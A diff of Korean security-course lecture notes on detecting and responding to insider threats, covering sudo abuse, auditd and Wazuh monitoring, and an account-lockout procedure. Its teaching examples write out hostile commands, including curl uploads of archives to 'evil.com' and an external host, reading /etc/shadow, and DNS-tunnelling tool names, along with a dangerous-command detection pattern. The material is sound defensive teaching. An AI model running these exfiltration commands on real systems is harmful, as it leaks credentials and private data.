@@ -1,337 +1,369 @@
-# Week 12: 인시던트 대응 (3) - 내부 위협
+# Week 12: 인시던트 대응 실습 (3) - 내부 위협
 
 ## 학습 목표
-
-- 내부자 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
-- sudo 남용, 비인가 접근, 데이터 유출을 탐지할 수 있다
-- 내부자 위협에 대한 인시던트 대응 절차를 수행한다
-- 로그 기반 내부자 행위 분석을 실습한다
+- 내부 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
+- sudo 남용, 비인가 접근, 데이터 유출 시나리오를 분석한다
+- auditd와 Wazuh를 활용한 내부 행위 모니터링을 수행한다
+- 내부 위협 인시던트 대응 보고서를 작성한다
 
 ---
 
-## 1. 내부자 위협 개요
+## 1. 내부 위협 개요
 
-### 1.1 유형
+### 1.1 내부 위협 분류
 
-| 유형 | 동기 | 예시 |
+| 유형 | 설명 | 예시 |
 |------|------|------|
-| 악의적 내부자 | 금전, 불만, 경쟁사 이직 | 데이터 유출, 시스템 파괴 |
-| 부주의한 내부자 | 실수, 무지 | 설정 오류, 비밀번호 공유 |
-| 침해된 내부자 | 계정 탈취 | 공격자가 직원 계정 사용 |
+| 악의적 내부자 | 의도적 데이터 유출/파괴 | 퇴직 전 기밀 반출 |
+| 부주의한 내부자 | 실수로 보안 위반 | 민감 파일 공개 공유 |
+| 권한 남용 | 업무 범위 초과 접근 | sudo로 타인 파일 열람 |
+| 계정 탈취 | 외부 공격자가 내부 계정 사용 | 피싱으로 크리덴셜 탈취 |
 
-### 1.2 내부자 위협이 위험한 이유
+### 1.2 시나리오
 
-- **이미 접근 권한이 있음** → 방화벽으로 막을 수 없음
-- **정상 행위와 구분이 어려움** → FP가 매우 높음
-- **탐지까지 평균 77일** (Ponemon 연구)
-
----
-
-## 2. 탐지: sudo 남용
-
-### 2.1 sudo 사용 패턴 분석
-
-```bash
-# 전체 sudo 사용 이력
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "========== $ip =========="
-  sshpass -p1 ssh user@$ip "grep 'COMMAND=' /var/log/auth.log 2>/dev/null | \
-    awk -F'COMMAND=' '{print \$2}' | sort | uniq -c | sort -rn | head -10"
-done
 ```
+시나리오: IT 관리자(user)가 sudo 권한을 남용하여
+         다른 사용자 파일 열람 및 외부 전송 시도
 
-### 2.2 위험한 sudo 명령 탐지
-
-```bash
-# 위험 명령 패턴
-DANGER_CMDS="rm -rf|chmod 777|chown root|passwd|useradd|userdel|visudo|cat /etc/shadow|dd if=|mkfs|fdisk"
-
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: 위험 sudo 명령 ==="
-  sshpass -p1 ssh user@$ip "grep 'COMMAND=' /var/log/auth.log 2>/dev/null | \
-    grep -iE '$DANGER_CMDS'" 2>/dev/null
-done
-```
-
-### 2.3 비인가 sudo 시도
-
-```bash
-# sudoers에 없는 사용자의 sudo 시도
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip ==="
-  sshpass -p1 ssh user@$ip "grep 'NOT in sudoers' /var/log/auth.log 2>/dev/null"
-done
-
-# sudo 인증 실패
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip ==="
-  sshpass -p1 ssh user@$ip "grep 'authentication failure.*sudo' /var/log/auth.log 2>/dev/null"
-done
+모니터링: auditd -> Wazuh SIEM -> SOC 분석
 ```
 
 ---
 
-## 3. 탐지: 비인가 접근
+## 2. 탐지: sudo 남용 모니터링
 
-### 3.1 비정상 시간대 접근
+### 2.1 auth.log에서 sudo 사용 이력 분석
 
 ```bash
-# 업무 외 시간 로그인 (22:00~06:00)
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: 야간 로그인 ==="
-  sshpass -p1 ssh user@$ip "grep 'Accepted\|session opened' /var/log/auth.log 2>/dev/null | \
-    awk '{
-      split(\$3,t,\":\");
-      h=int(t[1]);
-      if(h>=22 || h<=5) print
-    }' | head -5"
-done
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== sudo 사용 이력 분석 ==="
+
+# 전체 sudo 명령 이력
+echo "--- 최근 sudo 명령 ---"
+grep "sudo:" /var/log/auth.log 2>/dev/null | tail -15
+
+echo ""
+echo "--- sudo 사용 통계 ---"
+grep "sudo:" /var/log/auth.log 2>/dev/null | \
+  grep "COMMAND=" | \
+  sed 's/.*COMMAND=//' | \
+  sort | uniq -c | sort -rn | head -10
+
+echo ""
+echo "--- sudo 실패 (비인가 시도) ---"
+grep -E "sudo:.*NOT in sudoers|authentication failure" /var/log/auth.log 2>/dev/null | tail -5
+
+echo ""
+echo "--- 사용자별 sudo 빈도 ---"
+grep "sudo:" /var/log/auth.log 2>/dev/null | \
+  grep -oP "USER=\w+" | sort | uniq -c | sort -rn
+ENDSSH
 ```
 
-### 3.2 비정상 출발지 접근
+### 2.2 auditd 규칙으로 민감 행위 감시
 
 ```bash
-# 평소와 다른 IP에서의 로그인
-sshpass -p1 ssh user@192.168.208.142 "grep 'Accepted' /var/log/auth.log 2>/dev/null | \
-  awk '{for(i=1;i<=NF;i++) if(\$i==\"from\") print \$(i+1)}' | sort | uniq -c | sort -rn"
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== auditd 규칙 확인 ==="
+
+# 현재 audit 규칙 확인
+echo "1" | sudo -S auditctl -l 2>/dev/null || echo "auditd 미설치 또는 비활성"
+
+echo ""
+echo "--- 권장 audit 규칙 (내부 위협 탐지) ---"
+cat << 'RULES'
+# 민감 파일 접근 감시
+-w /etc/passwd -p wa -k identity_change
+-w /etc/shadow -p wa -k identity_change
+-w /etc/sudoers -p wa -k sudo_change
+
+# sudo 설정 변경 감시
+-w /etc/sudoers.d/ -p wa -k sudo_change
+
+# 대량 파일 복사/이동
+-a always,exit -F arch=b64 -S rename,renameat -k file_move
+-w /usr/bin/scp -p x -k data_exfil
+-w /usr/bin/rsync -p x -k data_exfil
+-w /usr/bin/curl -p x -k data_exfil
+
+# 계정 생성/삭제
+-w /usr/sbin/useradd -p x -k account_change
+-w /usr/sbin/userdel -p x -k account_change
+RULES
+ENDSSH
 ```
 
-### 3.3 권한 변경 탐지
+### 2.3 Wazuh에서 내부 위협 경보
 
 ```bash
-# 그룹 변경 (sudo 그룹에 추가)
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip ==="
-  sshpass -p1 ssh user@$ip "grep -E 'usermod|groupmod|useradd.*sudo|gpasswd' /var/log/auth.log 2>/dev/null"
-done
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
+echo "=== Wazuh 내부 위협 관련 경보 ==="
 
-# /etc/sudoers 변경
-sshpass -p1 ssh user@192.168.208.152 "cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
+cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
 import sys, json
+sudo_alerts = []
 for line in sys.stdin:
     try:
-        a = json.loads(line)
-        sc = a.get('syscheck',{})
-        if sc.get('path','') in ['/etc/sudoers', '/etc/passwd', '/etc/shadow', '/etc/group']:
-            print(f'  {a.get(\"timestamp\",\"\")} - {sc[\"path\"]} 변경')
+        a = json.loads(line.strip())
+        desc = a.get('rule',{}).get('description','').lower()
+        full_log = a.get('full_log','').lower()
+        if 'sudo' in desc or 'sudo' in full_log or 'privilege' in desc:
+            sudo_alerts.append(a)
     except: pass
-\" 2>/dev/null | tail -5"
+
+print(f'sudo/권한 관련 경보: {len(sudo_alerts)}건')
+for a in sudo_alerts[-10:]:
+    rule = a.get('rule',{})
+    ts = a.get('timestamp','')
+    agent = a.get('agent',{}).get('name','')
+    print(f'  [{rule.get(\"level\",0)}] {ts[:19]} ({agent}) {rule.get(\"description\",\"\")[:60]}')
+" 2>/dev/null || echo "경보 데이터 접근 불가"
+ENDSSH
 ```
 
 ---
 
-## 4. 탐지: 데이터 유출
+## 3. 분석: 내부 위협 시나리오 재현
 
-### 4.1 대량 파일 접근
-
-```bash
-# 대량 파일 읽기 패턴 (auditd가 있는 경우)
-sshpass -p1 ssh user@192.168.208.142 "cat /var/log/audit/audit.log 2>/dev/null | \
-  grep 'type=SYSCALL' | grep 'success=yes' | grep -E 'open|read' | tail -10"
-
-# 대용량 파일 복사/전송 흔적
-sshpass -p1 ssh user@192.168.208.142 "grep -E 'scp|rsync|curl.*upload|wget' /var/log/auth.log 2>/dev/null"
-```
-
-### 4.2 외부 전송 탐지
+### 3.1 시나리오 1 - sudo를 이용한 파일 열람
 
 ```bash
-# 대량 외부 데이터 전송
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: 외부 연결 ==="
-  sshpass -p1 ssh user@$ip "ss -tnp state established 2>/dev/null | \
-    grep -v '192.168.208\|10.20.30\|127.0.0' | head -5"
-done
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 시나리오 1: sudo 파일 열람 시뮬레이션 ==="
 
-# Suricata에서 대량 데이터 전송 탐지
-sshpass -p1 ssh user@192.168.208.150 "cat /var/log/suricata/eve.json 2>/dev/null | python3 -c \"
-import sys, json
-for line in sys.stdin:
-    try:
-        e = json.loads(line)
-        if e.get('event_type') == 'flow':
-            f = e.get('flow',{})
-            bytes_out = f.get('bytes_toserver',0)
-            if bytes_out > 1000000:  # 1MB 이상 전송
-                print(f'  {e.get(\"timestamp\",\"\")} {e.get(\"src_ip\",\"\")} -> {e.get(\"dest_ip\",\"\")} : {bytes_out} bytes')
-    except: pass
-\" 2>/dev/null | tail -10"
-```
-
-### 4.3 USB/이동매체 사용 탐지
-
-```bash
-# USB 장치 연결 로그
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "=== $ip: USB ==="
-  sshpass -p1 ssh user@$ip "dmesg | grep -i 'usb.*storage\|usb.*mass' 2>/dev/null | tail -3"
-  sshpass -p1 ssh user@$ip "journalctl -k | grep -i 'usb' 2>/dev/null | tail -3"
-done
-```
-
----
-
-## 5. 사용자 행위 분석 (UBA)
-
-### 5.1 사용자별 활동 프로파일
-
-```bash
-# 각 사용자의 활동 통계
-sshpass -p1 ssh user@192.168.208.142 "
-echo '=== 사용자별 로그인 횟수 ==='
-grep 'session opened' /var/log/auth.log 2>/dev/null | \
-  awk '{for(i=1;i<=NF;i++) if(\$i==\"for\" && \$(i+1)==\"user\") print \$(i+2)}' | \
-  sort | uniq -c | sort -rn
-
-echo ''
-echo '=== 사용자별 sudo 횟수 ==='
-grep 'COMMAND=' /var/log/auth.log 2>/dev/null | \
-  awk '{for(i=1;i<=NF;i++) if(\$i ~ /^user=/) print \$i}' | \
-  sort | uniq -c | sort -rn
-
-echo ''
-echo '=== 사용자별 SSH 실패 ==='
-grep 'Failed password' /var/log/auth.log 2>/dev/null | \
-  awk '{for(i=1;i<=NF;i++) if(\$i==\"for\") {if(\$(i+1)==\"invalid\") print \$(i+3); else print \$(i+1)}}' | \
-  sort | uniq -c | sort -rn | head -5
-"
-```
-
-### 5.2 비정상 행위 지표
-
-| 지표 | 설명 | 탐지 방법 |
-|------|------|----------|
-| 접근 시간 이상 | 업무 외 시간 접근 | 시간대별 로그인 분석 |
-| 접근 빈도 이상 | 평소보다 많은 접근 | 일별 로그인 통계 비교 |
-| 접근 대상 이상 | 업무와 무관한 서버 접근 | 서버별 접근 패턴 |
-| 데이터 양 이상 | 대량 다운로드/복사 | 네트워크 트래픽 분석 |
-| 권한 행사 이상 | 불필요한 sudo 사용 | sudo 로그 분석 |
-
----
-
-## 6. 대응 절차
-
-### 6.1 내부자 위협 대응의 특수성
-
-| 외부 위협 대응 | 내부자 위협 대응 |
-|---------------|----------------|
-| 즉시 차단 가능 | 법적/HR 절차 필요 |
-| 기술적 격리 | 사회적 고려 필요 |
-| 증거 수집 간단 | 프라이버시 이슈 |
-| IP 차단 | 계정 관리 (즉시 잠금이 어려울 수 있음) |
-
-### 6.2 대응 단계
-
-```
-1. 탐지 → 의심 행위 식별
-2. 비밀 조사 → 증거 수집 (당사자 모르게)
-3. HR/법무 협의 → 법적 절차 확인
-4. 증거 보존 → 포렌식 이미지 생성
-5. 대응 조치 → 계정 잠금, 접근 차단
-6. 조사 완료 → 징계/법적 조치
-7. 재발 방지 → 정책 강화
-```
-
-### 6.3 실습: 증거 보존
-
-```bash
-# 내부자 조사 시 증거 수집
-echo "=== 증거 수집 (의심 사용자: user) ==="
-
-TARGET_USER="user"
-IP="192.168.208.142"
-
-echo "[1] 로그인 이력"
-sshpass -p1 ssh user@$IP "last $TARGET_USER 2>/dev/null | head -20"
+echo "--- Step 1: 다른 사용자 디렉토리 접근 시도 ---"
+ls /root/ 2>&1 | head -3
+echo "(일반 사용자로는 접근 불가)"
 
 echo ""
-echo "[2] sudo 이력"
-sshpass -p1 ssh user@$IP "grep '$TARGET_USER' /var/log/auth.log 2>/dev/null | grep COMMAND | tail -20"
+echo "--- Step 2: sudo로 접근 (권한 남용) ---"
+echo "1" | sudo -S ls /root/ 2>/dev/null | head -5
 
 echo ""
-echo "[3] 파일 접근 이력 (최근 수정)"
-sshpass -p1 ssh user@$IP "find /home/$TARGET_USER -type f -mtime -7 2>/dev/null | head -20"
+echo "--- Step 3: 접근 로그 확인 ---"
+grep "sudo.*COMMAND.*ls.*root" /var/log/auth.log 2>/dev/null | tail -3
 
 echo ""
-echo "[4] 네트워크 활동"
-sshpass -p1 ssh user@$IP "ss -tnp 2>/dev/null | grep -v '127.0.0'"
-
-echo ""
-echo "[5] 프로세스"
-sshpass -p1 ssh user@$IP "ps -u $TARGET_USER -o pid,start,etime,args 2>/dev/null"
+echo "=== 탐지 포인트 ==="
+echo "1. auth.log에 sudo COMMAND 기록"
+echo "2. auditd에서 /root 접근 기록"
+echo "3. Wazuh rule 5402 (sudo 명령 실행) 경보"
+ENDSSH
 ```
 
----
-
-## 7. ATT&CK 매핑
-
-| 내부자 행위 | 전술 | 기법 |
-|------------|------|------|
-| 비인가 데이터 접근 | TA0009 Collection | T1005 Data from Local System |
-| sudo 권한 남용 | TA0004 Privilege Escalation | T1548 Abuse Elevation Control |
-| 계정 정보 열람 | TA0006 Credential Access | T1003 OS Credential Dumping |
-| USB로 데이터 복사 | TA0010 Exfiltration | T1052 Exfiltration Over Physical Medium |
-| 네트워크로 전송 | TA0010 Exfiltration | T1048 Exfiltration Over Alternative Protocol |
-| 로그 삭제 | TA0005 Defense Evasion | T1070 Indicator Removal |
-| 백도어 계정 생성 | TA0003 Persistence | T1136 Create Account |
-
----
-
-## 8. 예방 대책
-
-### 8.1 기술적 대책
+### 3.2 시나리오 2 - 데이터 유출 시도 패턴
 
 ```bash
-# 1. 최소 권한 원칙 확인
-echo "=== sudo 권한 사용자 ==="
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
-  echo "$ip: $(sshpass -p1 ssh user@$ip 'getent group sudo 2>/dev/null')"
-done
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+python3 << 'PYEOF'
+exfil_indicators = [
+    {
+        "pattern": "대량 파일 압축",
+        "commands": ["tar czf /tmp/backup.tar.gz /etc/", "zip -r /tmp/data.zip /var/log/"],
+        "detection": "auditd: tar/zip 실행 감시, 파일 크기 모니터링",
+    },
+    {
+        "pattern": "외부 전송",
+        "commands": ["scp /tmp/data.zip user@external:/", "curl -F file=@/tmp/data.zip http://evil.com/"],
+        "detection": "auditd: scp/curl 실행 감시, DLP 솔루션",
+    },
+    {
+        "pattern": "DNS 터널링",
+        "commands": ["dnscat2", "iodine"],
+        "detection": "Suricata: 비정상 DNS 쿼리 탐지, DNS 쿼리 길이/빈도",
+    },
+    {
+        "pattern": "USB 복사",
+        "commands": ["mount /dev/sdb1 /mnt", "cp -r /data /mnt/"],
+        "detection": "udev 규칙, auditd: mount 감시",
+    },
+]
 
-# 2. 세션 타임아웃 설정 확인
-echo "=== TMOUT 설정 ==="
-sshpass -p1 ssh user@192.168.208.142 "grep TMOUT /etc/profile /etc/bash.bashrc 2>/dev/null || echo '미설정'"
-
-# 3. 로그 중앙 수집 확인
-echo "=== Wazuh Agent ==="
-for ip in 192.168.208.142 192.168.208.150 192.168.208.151; do
-  echo -n "$ip: "
-  sshpass -p1 ssh user@$ip "systemctl is-active wazuh-agent 2>/dev/null || echo 'N/A'"
-done
+print(f"{'패턴':<20} {'탐지 방법'}")
+print("=" * 70)
+for ind in exfil_indicators:
+    print(f"\n{ind['pattern']}")
+    for cmd in ind['commands']:
+        print(f"  명령: {cmd}")
+    print(f"  탐지: {ind['detection']}")
+PYEOF
+ENDSSH
 ```
 
-### 8.2 관리적 대책
+### 3.3 UEBA 스타일 행위 이상 탐지
 
-| 대책 | 내용 |
-|------|------|
-| 접근 권한 정기 검토 | 분기별 권한 리뷰 |
-| 직무 분리 | 중요 작업은 2인 승인 |
-| 퇴직 절차 | 퇴직 당일 계정 즉시 비활성화 |
-| 보안 교육 | 내부자 위협 인식 교육 |
-| 감사 로그 | auditd로 상세 행위 기록 |
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+python3 << 'PYEOF'
+user_activities = [
+    {"time": "09:00", "action": "login", "detail": "SSH 로그인"},
+    {"time": "09:05", "action": "command", "detail": "ls, cd (일반 작업)"},
+    {"time": "09:30", "action": "command", "detail": "vim config.yaml"},
+    {"time": "14:00", "action": "sudo", "detail": "sudo cat /etc/shadow"},
+    {"time": "14:01", "action": "sudo", "detail": "sudo ls /root/"},
+    {"time": "14:02", "action": "command", "detail": "tar czf /tmp/data.tar.gz /root/"},
+    {"time": "14:03", "action": "command", "detail": "curl -X POST http://ext.example.com -F f=@/tmp/data.tar.gz"},
+    {"time": "14:05", "action": "command", "detail": "rm /tmp/data.tar.gz"},
+    {"time": "17:00", "action": "logout", "detail": "정상 퇴근"},
+]
+
+print("시간   행위        상세                                           판정")
+print("=" * 85)
+for act in user_activities:
+    anomaly = False
+    reason = ""
+    if "shadow" in act["detail"]: anomaly, reason = True, "민감 파일 접근"
+    elif "/root/" in act["detail"] and "sudo" in act["action"]: anomaly, reason = True, "타 사용자 디렉토리"
+    elif "tar" in act["detail"] and "/root" in act["detail"]: anomaly, reason = True, "대량 데이터 수집"
+    elif "curl" in act["detail"] and "ext" in act["detail"]: anomaly, reason = True, "외부 전송 시도"
+    elif act["detail"].startswith("rm") and "tmp" in act["detail"]: anomaly, reason = True, "증거 인멸 의심"
+
+    flag = f"[ANOMALY] {reason}" if anomaly else "[NORMAL]"
+    print(f"{act['time']}  {act['action']:<10}  {act['detail']:<45} {flag}")
+PYEOF
+ENDSSH
+```
 
 ---
 
-## 9. 핵심 정리
+## 4. 대응 (Response)
 
-1. **내부자 위협** = 악의적/부주의/침해된 내부자 3유형
-2. **탐지 어려움** = 정상 행위와 구분이 어려움, FP 높음
-3. **sudo 분석** = 위험 명령, 비인가 시도, 사용 패턴
-4. **데이터 유출** = 네트워크 전송, USB, 대량 파일 접근
-5. **법적 절차** = HR/법무 협의 후 조치 (기술 대응만으로 부족)
+### 4.1 계정 비활성화 절차
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.1 << 'ENDSSH'
+echo "=== 계정 비활성화 절차 (교육용) ==="
+
+cat << 'PROCEDURE'
+내부 위협 확인 시 즉시 대응 절차:
+
+1. 계정 비활성화
+   $ sudo usermod -L [username]
+   $ sudo chage -E 0 [username]
+
+2. 활성 세션 강제 종료
+   $ sudo pkill -u [username]
+
+3. SSH 키 비활성화
+   $ sudo mv /home/[user]/.ssh/authorized_keys /home/[user]/.ssh/authorized_keys.disabled
+
+4. sudo 권한 제거
+   $ sudo deluser [username] sudo
+
+5. 증거 보전
+   $ sudo cp -rp /home/[username]/ /evidence/$(date +%Y%m%d)/
+   $ sudo cp /var/log/auth.log /evidence/$(date +%Y%m%d)/
+   $ sudo journalctl _UID=[uid] > /evidence/$(date +%Y%m%d)/journal.log
+PROCEDURE
+
+echo ""
+echo "--- 현재 활성 사용자 ---"
+who 2>/dev/null
+echo ""
+echo "--- sudo 그룹 ---"
+getent group sudo 2>/dev/null
+ENDSSH
+```
+
+### 4.2 Wazuh Active Response 설정
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 << 'ENDSSH'
+echo "=== Wazuh Active Response 설정 예시 ==="
+
+cat << 'CONFIG'
+<!-- ossec.conf Active Response -->
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>5402,5403</rules_id>
+  <timeout>3600</timeout>
+</active-response>
+
+<active-response>
+  <command>firewall-drop</command>
+  <location>local</location>
+  <rules_id>5710,5712</rules_id>
+  <timeout>1800</timeout>
+</active-response>
+CONFIG
+
+echo ""
+echo "--- Active Response 바이너리 ---"
+ls -la /var/ossec/active-response/bin/ 2>/dev/null | head -10
+ENDSSH
+```
 
 ---
 
-## 과제
+## 5. 보고서 작성
 
-1. 4개 서버에서 sudo 사용 이력을 분석하고 위험 명령을 보고하시오
-2. 야간 시간대(22:00~06:00) 로그인을 탐지하시오
-3. 내부자 위협 탐지를 위한 SIGMA 규칙을 1개 작성하시오
+### 5.1 LLM 보고서 자동 생성
+
+```bash
+curl -s http://192.168.0.105:11434/v1/chat/completions \
+  -H "Content-Type: application/json" \
+  -d '{
+    "model": "gemma3:12b",
+    "messages": [
+      {"role": "system", "content": "SOC 인시던트 대응 보고서 작성 전문가입니다. 한국어로 전문적인 보고서를 작성합니다."},
+      {"role": "user", "content": "다음 내부 위협 인시던트 보고서를 작성하세요:\n\n사건: IT 관리자가 sudo로 /etc/shadow, /root/ 접근 후 tar로 수집, curl로 외부 전송 시도, 증거 삭제\n탐지: auth.log sudo 이력 -> Wazuh 경보 -> SOC\n대응: 계정 잠금, sudo 제거, 세션 종료\n\n1) 타임라인 2) ATT&CK 매핑 3) 재발 방지 권고"}
+    ],
+    "temperature": 0.3
+  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
+```
 
 ---
 
-## 참고 자료
+## 6. 내부 위협 방지 체계
 
-- CERT Insider Threat Guide (Carnegie Mellon)
-- MITRE ATT&CK for Enterprise: Insider Threat
-- SANS Insider Threat Detection Techniques
+### 6.1 예방적 통제
+
+```bash
+sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
+python3 << 'PYEOF'
+controls = {
+    "기술적 통제": [
+        ("최소 권한 원칙", "필요 최소한의 sudo 명령만 허용"),
+        ("DLP", "민감 데이터 외부 전송 차단"),
+        ("UEBA", "사용자 행위 이상 탐지"),
+        ("네트워크 세분화", "내부 네트워크 접근 제한"),
+        ("MFA", "중요 시스템 다중 인증"),
+    ],
+    "관리적 통제": [
+        ("접근 리뷰", "분기별 권한 점검"),
+        ("퇴직자 절차", "즉시 계정 비활성화"),
+        ("보안 교육", "내부 위협 인식 교육"),
+        ("감사 로그", "모든 관리자 행위 기록"),
+    ],
+    "탐지적 통제": [
+        ("로그 모니터링", "sudo, SSH, 파일 접근 실시간 감시"),
+        ("경보 규칙", "비정상 시간대/패턴 경보"),
+        ("정기 감사", "월별 관리자 행위 감사"),
+    ],
+}
+
+for category, items in controls.items():
+    print(f"\n{category}")
+    print("=" * 50)
+    for name, desc in items:
+        print(f"  - {name}: {desc}")
+PYEOF
+ENDSSH
+```
+
+---
+
+## 핵심 정리
+
+1. 내부 위협은 악의적 내부자, 부주의, 권한 남용, 계정 탈취로 분류된다
+2. auth.log와 auditd는 내부 행위 모니터링의 핵심 데이터 소스다
+3. UEBA 관점에서 사용자 행위 패턴 이상을 탐지해야 한다
+4. 내부 위협 확인 시 계정 잠금, 세션 종료, 증거 보전 순서로 대응한다
+5. 최소 권한 원칙과 정기 접근 리뷰가 예방의 핵심이다
+6. 기술적 + 관리적 + 탐지적 통제를 조합해야 효과적이다
+
+---
+
+## 다음 주 예고
+- Week 13: 위협 인텔리전스(CTI) 활용 - OpenCTI 연동, IOC 조회, 위협 헌팅
